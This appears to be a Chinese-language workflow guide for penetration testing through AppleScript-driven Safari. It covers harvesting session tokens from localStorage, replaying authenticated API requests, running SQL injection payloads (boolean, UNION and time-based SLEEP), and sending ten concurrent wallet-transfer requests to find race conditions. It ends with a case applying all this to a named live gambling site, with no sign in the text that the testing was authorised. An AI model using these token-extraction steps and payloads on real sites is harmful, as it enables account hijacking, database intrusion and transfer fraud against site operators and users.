# Safari osascript 认证测试工作流

## 概述

当浏览器工具无法绕过CAPTCHA时，用macOS的osascript控制Safari浏览器完成认证后的渗透测试。这是因为：
- Session Token绑定到浏览器会话，Python/curl无法复用
- botion等CAPTCHA系统无法自动绕过
- 用户手动过验证码后，通过Safari的JS引擎执行所有测试

## 完整工作流

### Step 1: 导航到目标

```bash
osascript -e 'tell application "Safari" to set URL of current tab of window 1 to "https://TARGET/m/#/home"'
```

### Step 2: 用户手动登录

让用户在Safari中手动完成：
1. 点击登录按钮
2. 输入手机号和密码
3. 完成CAPTCHA验证
4. 登录成功

### Step 3: 提取Session Token

```bash
# 获取完整localStorage
osascript -e 'tell application "Safari" to do JavaScript "localStorage.getItem(\"user\")" in current tab of window 1'

# 提取APPEND_HEADER（认证所需的header）
osascript -e 'tell application "Safari" to do JavaScript "JSON.stringify(JSON.parse(localStorage.getItem(\"user\")).userInfo.APPEND_HEADER)" in current tab of window 1'

# 提取用户ID
osascript -e 'tell application "Safari" to do JavaScript "JSON.parse(localStorage.getItem(\"user\")).userInfo.ID" in current tab of window 1'
```

### Step 4: 通过Safari执行认证API测试

由于Token绑定浏览器，所有认证后的测试必须通过Safari的fetch执行：

```bash
osascript -e 'tell application "Safari" to do JavaScript "
(async function() {
  const h = {
    \"uuv-user-loginkey\": \"{LOGIN_USER_KEY}\",
    \"uuv-user-session-{USER_ID}\": \"{SESSION_KEY}\",
    \"platform-ident\": \"uu\"
  };
  const dec = (b) => { try { return JSON.parse(atob(b.split(\"\").reverse().join(\"\"))); } catch(e) { return b.substring(0,200); } };
  
  const endpoints = [
    \"/api/User/GetUserInfo\",
    \"/api/User/GetAccount\",
    \"/api/User/GetOrderList_New\",
    // ... 更多端点
  ];
  
  const results = {};
  for (const ep of endpoints) {
    try {
      const r = await fetch(ep, {headers: h});
      const d = dec(await r.text());
      results[ep] = {state: d.state || \"array\", sample: JSON.stringify(d).substring(0, 100)};
    } catch(e) { results[ep] = {error: e.message}; }
  }
  
  document.title = JSON.stringify(results);
})();
\"done\"" in current tab of window 1'
```

### Step 5: 读取结果

```bash
# 等待异步操作完成
sleep 5

# 读取结果（存在页面标题中）
osascript -e 'tell application "Safari" to get name of current tab of window 1'
```

## 关键技巧

### 结果存储策略

osascript的JavaScript执行结果只能通过`document.title`返回（因为异步操作）。但标题长度有限制（~2000字符），所以：
- 大量结果分批执行
- 每批结果写入title后立即读取
- 读取后用Python解析JSON

### 错误处理

```javascript
// Safari的fetch可能因CORS失败，用try-catch包裹
try {
  const r = await fetch(ep, {headers: h});
  if (!r.ok) throw new Error(`HTTP ${r.status}`);
  const d = dec(await r.text());
  // ...
} catch(e) {
  results[ep] = {error: e.message};
}
```

### SQL注入测试

```javascript
// URL编码payload
const sqli = [
  \"/api/User/GetOrderList_New?page=1%27+OR+%271%27%3D%271\",
  \"/api/User/GetOrderList_New?page=1+AND+1%3D1--\",
  \"/api/User/GetLotterList?page=1%27+UNION+SELECT+NULL--\",
];

// Time-based blind
const t1 = Date.now();
await fetch(\"/api/User/GetOrderList_New?page=1\", {headers: h});
const normal = Date.now() - t1;

const t2 = Date.now();
await fetch(\"/api/User/GetOrderList_New?page=1%27+AND+SLEEP(3)--\", {headers: h});
const sqli = Date.now() - t2;

// 如果sqli - normal ≈ 3000ms，则存在SQL注入
```

### 竞态条件测试

```javascript
// 并发发送同一个请求
const results = {success: 0, error: 0};
const promises = [];
for (let i = 0; i < 10; i++) {
  promises.push(
    fetch(\"/api/User/TransferOperate\", {
      method: \"POST\",
      headers: {...h, \"Content-Type\": \"application/json\"},
      body: JSON.stringify({fromAcc: \"my_wallet\", toAcc: \"ag_live\", amount: \"1\"})
    }).then(r => r.text()).then(t => {
      const d = dec(t);
      if (d.state === \"success\") results.success++;
      else results.error++;
    })
  );
}
await Promise.all(promises);
// 如果success > 1，存在竞态条件漏洞
```

## 限制

- 标题长度限制：~2000字符，大量数据需分批
- 异步操作需要sleep等待
- Safari可能因长时间无操作而休眠标签页
- CORS限制：某些跨域请求可能失败

## osascript Promise处理

Safari的`do JavaScript`不支持async/Promise返回。错误：`变量"jsResult"没有定义`。

**解决方案**: 用同步XHR替代async fetch：

```javascript
// 同步XHR（立即返回结果）
var xhr = new XMLHttpRequest();
xhr.open('GET', '/api/User/GetUserInfo', false);  // false = synchronous
xhr.setRequestHeader('Token', token);
xhr.setRequestHeader('platform-ident', 'uu');
xhr.send();
var result = xhr.responseText;
```

**fire-and-forget模式**（竞态条件测试）：
```javascript
// 先fire异步请求，存结果到全局变量
window._raceResults = {done: 0, results: []};
for (var i = 0; i < 10; i++) {
  fetch('/api/User/TransferOperate', {
    method: 'POST',
    headers: {'Token': token, 'platform-ident': 'uu'},
    body: formData
  }).then(r => r.text()).then(t => {
    window._raceResults.results.push(decrypt(t));
    window._raceResults.done++;
  });
}
// 第二个osascript读取: window._raceResults
```

## Token格式

赌博站的Token是JSON对象（不是简单字符串）：
```json
{
  "USER_SESSION_KEY": {"key": "uuv-user-session-{userId}", "value": "{uuid}"},
  "LOGIN_USER_KEY": {"key": "uuv-user-loginkey", "value": "{hash}"}
}
```

获取方式：
```javascript
var sessionKey = JSON.parse(localStorage.getItem('USER_SESSION_KEY'));
var loginKey = JSON.parse(localStorage.getItem('LOGIN_USER_KEY'));
var token = JSON.stringify({
  USER_SESSION_KEY: sessionKey,
  LOGIN_USER_KEY: loginKey
});
```

## FormData POST请求

转账/充值API使用`multipart/form-data`（不是JSON）：
```javascript
var formData = new FormData();
formData.append('transfer_amt', '100');
formData.append('OUT_INT_IDENT_CD', 'my_wallet');
formData.append('IN_INT_IDENT_CD', 'ag_live');

var xhr = new XMLHttpRequest();
xhr.open('POST', '/api/User/TransferOperate', false);
xhr.setRequestHeader('Token', token);
xhr.setRequestHeader('platform-ident', 'uu');
xhr.send(formData);
```

## 实战案例: 982827.com (2026-08)

- 用户手动登录后，通过Safari执行了13个认证API测试
- 发现：Session Token绑定浏览器，Python请求返回"会话已过期"
- 通过Safari成功访问：GetUserInfo、GetAccount、GetOrderList_New等
- SQL注入测试：SLEEP(3)无延迟效果，确认不可注入
- IDOR测试：?id=参数被忽略，始终返回当前用户数据
- 竞态条件：转账需要提现密码(DRAW_PASSWORD)，无法测试
